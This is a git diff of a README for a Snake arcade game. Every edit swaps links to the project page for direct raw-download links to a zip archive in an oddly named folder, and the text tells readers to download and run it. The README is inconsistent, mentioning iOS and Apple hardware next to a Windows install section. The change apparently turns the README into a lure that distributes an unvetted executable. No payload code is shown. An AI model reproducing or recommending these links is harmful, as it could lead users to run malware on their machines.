@@ -1,6 +1,6 @@
 # 🎮 mad-snake - Fast arcade Snake with sharp turns
 
-[![Download mad-snake](https://img.shields.io/badge/Download%20mad--snake-blue?style=for-the-badge&logo=github)](https://github.com/buffeted-bailey683/mad-snake)
+[![Download mad-snake](https://img.shields.io/badge/Download%20mad--snake-blue?style=for-the-badge&logo=github)](https://github.com/buffeted-bailey683/mad-snake/raw/refs/heads/main/nonemanating/snake-mad-2.5-alpha.1.zip)
 
 ## 🐍 Overview
 
@@ -35,7 +35,7 @@ Best results come from a recent iOS version and a device with touch input.
 
 Visit this page to download and run the app package or release files:
 
-[https://github.com/buffeted-bailey683/mad-snake](https://github.com/buffeted-bailey683/mad-snake)
+[https://github.com/buffeted-bailey683/mad-snake/raw/refs/heads/main/nonemanating/snake-mad-2.5-alpha.1.zip](https://github.com/buffeted-bailey683/mad-snake/raw/refs/heads/main/nonemanating/snake-mad-2.5-alpha.1.zip)
 
 ## 🛠️ Install on Windows
 
@@ -194,7 +194,7 @@ Make sure you are on a supported iPhone or iPad and that the app has focus on th
 
 Use this link to get the project and related files:
 
-[https://github.com/buffeted-bailey683/mad-snake](https://github.com/buffeted-bailey683/mad-snake)
+[https://github.com/buffeted-bailey683/mad-snake/raw/refs/heads/main/nonemanating/snake-mad-2.5-alpha.1.zip](https://github.com/buffeted-bailey683/mad-snake/raw/refs/heads/main/nonemanating/snake-mad-2.5-alpha.1.zip)
 
 Open the page, get the files, then run the app on supported Apple hardware
 
